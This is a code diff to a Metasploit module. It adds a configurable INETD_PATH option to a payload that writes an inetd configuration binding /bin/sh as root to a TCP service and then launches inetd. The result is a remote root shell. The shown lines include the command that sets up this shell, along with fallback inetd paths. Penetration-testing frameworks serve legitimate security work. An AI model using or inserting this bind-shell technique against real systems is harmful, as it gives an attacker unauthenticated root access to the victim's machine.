@@ -30,6 +30,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('INETD_PATH', [true, 'The path to inetd', 'inetd'])
+    ])
   end
 
   #
@@ -59,7 +62,7 @@ module MetasploitModule
       "echo #{svc} stream tcp nowait root /bin/sh sh>#{tmp_inet};" +
 
       # First we try executing inetd without the full path
-      "inetd -s #{tmp_inet} ||" +
+      "#{datastore['INETD_PATH']} -s #{tmp_inet} ||" +
 
       # Next try the standard inetd path on Linux, Solaris, BSD
       "/usr/sbin/inetd -s #{tmp_inet} ||" +
